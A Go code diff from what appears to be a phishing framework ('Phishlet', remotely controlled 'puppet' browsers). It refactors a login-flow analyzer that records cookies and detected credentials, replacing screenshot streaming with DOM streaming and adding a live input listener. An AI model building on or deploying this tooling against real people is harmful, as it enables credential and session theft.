@@ -80,12 +80,12 @@ type AnalyzerSession struct {
 	mu       sync.Mutex
 	puppetId int // associated puppet instance for UI control
 
-	// Screenshot support (reuses puppet infrastructure)
-	screenCh  chan []byte
-	stopCh    chan struct{}
-	viewportW int
-	viewportH int
-	lastScreen []byte
+	// DOM streaming support (reuses puppet infrastructure)
+	contentCh     chan *DOMUpdate
+	stopCh        chan struct{}
+	viewportW     int
+	viewportH     int
+	resourceCache *ResourceCache
 }
 
 // Known tracking/noise domains to filter out
@@ -195,10 +195,10 @@ func (a *Analyzer) StartAnalysis(targetURL string) (*AnalyzerSession, error) {
 		cookies:   []RecordedCookie{},
 		creds:     []DetectedCredential{},
 		domains:   make(map[string]*DomainStats),
-		screenCh:  make(chan []byte, 5),
-		stopCh:    make(chan struct{}),
-		viewportW: 1920,
-		viewportH: 1080,
+		contentCh:     make(chan *DOMUpdate, 5),
+		stopCh:        make(chan struct{}),
+		viewportW:     1920,
+		viewportH:     1080,
 	}
 
 	a.mu.Lock()
@@ -270,10 +270,11 @@ func (a *Analyzer) runRecording(sess *AnalyzerSession) {
 	log.Success("analyzer [%d]: recording started — interact via the puppet control panel", sess.Id)
 
 	// Register as a puppet instance so the web UI can control it
-	a.registerAsPuppet(sess)
+	puppet := a.registerAsPuppet(sess)
 
-	// Start screenshot loop for the puppet UI
-	go a.screenshotLoop(sess)
+	// Start DOM streaming loop using the registered puppet instance
+	// (so lastUpdate is set on the actual registered puppet, not a local copy)
+	go DomStreamLoop(puppet)
 
 	// Wait for stop signal
 	<-sess.stopCh
@@ -622,77 +623,33 @@ func (a *Analyzer) captureFinalCookies(sess *AnalyzerSession) {
 	log.Info("analyzer [%d]: captured %d cookies from final snapshot", sess.Id, len(cookies))
 }
 
-func (a *Analyzer) screenshotLoop(sess *AnalyzerSession) {
-	ticker := time.NewTicker(500 * time.Millisecond) // ~2fps — lighter on the server during recording
-	defer ticker.Stop()
-
-	for {
-		select {
-		case <-sess.stopCh:
-			return
-		case <-ticker.C:
-			sess.mu.Lock()
-			status := sess.Status
-			sess.mu.Unlock()
-
-			if status != "recording" {
-				continue
-			}
-
-			// Use a timeout context so a slow screenshot doesn't block everything
-			screenshotCtx, screenshotCancel := context.WithTimeout(sess.ctx, 3*time.Second)
-			var buf []byte
-			err := chromedp.Run(screenshotCtx, chromedp.ActionFunc(func(ctx context.Context) error {
-				var err error
-				buf, err = page.CaptureScreenshot().
-					WithFormat(page.CaptureScreenshotFormatJpeg).
-					WithQuality(40).
-					Do(ctx)
-				return err
-			}))
-			screenshotCancel()
-			if err != nil {
-				continue
-			}
-
-			sess.mu.Lock()
-			sess.lastScreen = buf
-			sess.mu.Unlock()
-
-			// Drain any stale frame before sending new one
-			select {
-			case <-sess.screenCh:
-			default:
-			}
-			select {
-			case sess.screenCh <- buf:
-			default:
-			}
-		}
-	}
-}
-
 // registerAsPuppet creates a puppet instance wrapper so the analyzer session
 // can be controlled through the existing puppet web UI.
-func (a *Analyzer) registerAsPuppet(sess *AnalyzerSession) {
+func (a *Analyzer) registerAsPuppet(sess *AnalyzerSession) *PuppetInstance {
+	rc := NewResourceCache(sess.Id + 10000)
+	sess.resourceCache = rc
+
 	puppet := &PuppetInstance{
-		Id:         sess.Id + 10000, // Offset to avoid ID collisions with regular puppets
-		SessionId:  0,
-		Phishlet:   "analyzer",
-		Username:   "login-flow-recording",
-		TargetURL:  sess.TargetURL,
-		Status:     PUPPET_RUNNING,
-		CreateTime: sess.StartTime,
-		ctx:        sess.ctx,
-		cancel:     sess.cancel,
-		allocCtx:   sess.allocCtx,
-		allocCancel: sess.allocCancel,
-		screenCh:   sess.screenCh,
-		stopCh:     sess.stopCh,
-		viewportW:  sess.viewportW,
-		viewportH:  sess.viewportH,
-		lastScreen: nil,
+		Id:            sess.Id + 10000, // Offset to avoid ID collisions with regular puppets
+		SessionId:     0,
+		Phishlet:      "analyzer",
+		Username:      "login-flow-recording",
+		TargetURL:     sess.TargetURL,
+		Status:        PUPPET_RUNNING,
+		CreateTime:    sess.StartTime,
+		ctx:           sess.ctx,
+		cancel:        sess.cancel,
+		allocCtx:      sess.allocCtx,
+		allocCancel:   sess.allocCancel,
+		contentCh:     sess.contentCh,
+		stopCh:        sess.stopCh,
+		viewportW:     sess.viewportW,
+		viewportH:     sess.viewportH,
+		resourceCache: rc,
 	}
+
+	// Set up input change listener for real-time text sync
+	SetupInputChangeListener(puppet)
 
 	sess.puppetId = puppet.Id
 
@@ -702,6 +659,8 @@ func (a *Analyzer) registerAsPuppet(sess *AnalyzerSession) {
 
 	controlURL := a.pm.GetControlURL(puppet.Id)
 	log.Info("analyzer [%d]: control URL: %s", sess.Id, controlURL)
+
+	return puppet
 }
 
 // StopAnalysis stops the recording and returns the session for analysis.
